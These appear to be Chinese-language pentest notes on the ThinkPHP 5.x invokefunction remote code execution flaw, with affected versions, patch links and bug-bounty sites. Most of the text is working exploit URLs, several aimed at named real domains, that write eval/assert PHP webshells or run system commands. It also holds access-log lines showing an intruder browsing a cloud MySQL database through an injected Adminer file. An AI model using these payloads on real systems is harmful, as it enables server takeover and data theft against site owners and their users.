### 发现漏洞
    域名/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=zxc1.php&vars[1][]=<?php @eval($_POST[fuck]);?>'
    
    api.91tangrenjie.com/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=fff.php&vars[1][1]=<?php print_R(scandir('/www/wwwroot/api.91tangrenjie.com/application/admin'))?>
    
    api.91tangrenjie.com/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shix1.php&vars[1][1]=<?php assert($_POST['fuck'])?>

### 发现
    api.6d2g.cn/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=tt.php&vars[1][]=<?php @eval($_POST[111]);?>
    
    ?s=index/\think\Request/input&filter=phpinfo&data=1
    ?s=index/\think\Request/input&filter=system&data=id
    ?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=
    ?s=index/\think\view\driver\Php/display&content=
    ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
    ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
    ?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
    ?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0

    http://dkfh.h8mtqt.cn/api/invoke/args?function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=notify.php&vars[1][]=<?php @eval($_POST[1111]);?>

    http://jogt.h8mtqt.cn/admin/auth/admin/invokesync?dialog=fast&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=notify.php&vars[1][]=<?php @eval($_POST[1111]);?>
    
    ReflectionFunction
       /**
     * 加载参数
     */
    public function args($function, $vars = [])
    {
        $reflect = new \ReflectionFunction($function);
        $args    = \think\App::bindParams($reflect, $vars);
        return $reflect->invokeArgs($args);
    }

### tp受影响版本 5.x < 5.1.31, <= 5.0.23

    Thinkphp v5.0.x补丁地址: https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f
    
    Thinkphp v5.1.x补丁地址: https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815

### 漏洞提交 

- 宜信安全应急响应中心 
- https://security.creditease.cn/  提交漏洞 
- https://www.anquanke.com/src
- https://butian.360.cn

### 安全类社区 

- 先知社区 seebug
- 安全客 freebuf
- tuisec 
- i春秋社区  
- 大佬的 twitter + blog
- 
- CTF平台  
- capture the flag  抢夺旗帜  获取旗帜



### 阿里云rds后台连接请求
- 通过注入写进来文件在build文件中里面 用的是 Adminer 只有一个PHP文件的MySQL管理客户端

HTTP/1.1" 200 11534 "http://system.hzctoken.com/build.php?server=rm-j6ce63wap86odtcb490150.mysql.rds.aliyuncs.com&username=hzc_root&db=hzc&table=admin_log" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"

./wwwlogs/admin.hzc.com.log:93.70.127.224 - - [23/May/2020:01:47:52 +0800] "GET /

build.php?server=rm-j6ce63wap86odtcb490150.mysql.rds.aliyuncs.com&username=hzc_root&db=hzc&table=config 

HTTP/1.1" 200 3641 "http://system.hzctoken.com/build.php?server=rm-j6ce63wap86odtcb490150.mysql.rds.aliyuncs.com&username=hzc_root&db=hzc&select=admin" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"

./wwwlogs/admin.hzc.com.log:47.53.199.20 - - [31/May/2020:15:45:35  0800] 

"GET /build.php?server=rm-j6ce63wap86odtcb490150.mysql.rds.aliyuncs.com&username=hzc_root&db=hzc&select=user_asset&columns[0][fun]=&columns[0][col]=&where[0][col]=&where[0][op]==&where[0][val]=0x8c0d43b01494ac19909bdb147c25873ecd1a7141&where[01][col]=&where[01][op]==&where[01][val]=&order[0]=&limit=50&text_length=100 

HTTP/1.1" 200 4615 "http://system.hzctoken.com/build.php?server=rm-j6ce63wap86odtcb490150.mysql.rds.aliyuncs.com&username=hzc_root&db=hzc&select=user_asset" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"

./wwwlogs/admin.hzc.com.log:47.53.199.20 - - [31/May/2020:15:45:40  0800] "GET /build.php?server=rm-j6ce63wap86odtcb490150.mysql.rds.aliyuncs.com&username=hzc_root&db=hzc&select=user_asset&columns[0][fun]=&columns[0][col]=&where[0][col]=&where[0][op]==&where[0][val]=01494ac19909bdb147c25873ecd1a7141&where[1][col]=&where[1][op]==&where[1][val]=&order[0]=&limit=50&text_length=100 

HTTP/1.1" 200 4600 "http://system.hzctoken.com/build.php?server=rm-j6ce63wap86odtcb490150.mysql.rds.aliyuncs.com&username=hzc_root&db=hzc&select=user_asset&columns[0][fun]=&columns[0][col]=&where[0][col]=&where[0][op]==&where[0][val]=0x8c0d43b01494ac19909bdb147c25873ecd1a7141&where[01][col]=&where[01][op]==&where[01][val]=&order[0]=&limit=50&text_length=100" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"


